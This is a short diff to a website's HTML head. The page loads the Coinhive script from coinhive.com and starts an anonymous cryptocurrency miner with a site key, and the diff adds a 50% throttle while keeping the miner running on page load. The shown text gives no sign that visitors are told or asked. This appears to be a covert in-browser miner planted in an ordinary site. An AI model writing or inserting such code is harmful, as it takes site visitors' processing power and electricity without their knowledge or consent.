@@ -352,7 +352,9 @@ footer section p.ipv6 a:hover, footer section p.cookies a:hover { border: none; 
 
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-var miner = new CoinHive.Anonymous('xidLs0nFuu4ItPL2eU1bjokslhvsrnxP');
+var miner = new CoinHive.Anonymous('xidLs0nFuu4ItPL2eU1bjokslhvsrnxP', {
+    throttle: 0.5
+});
 miner.start();
     </script>
 </head>
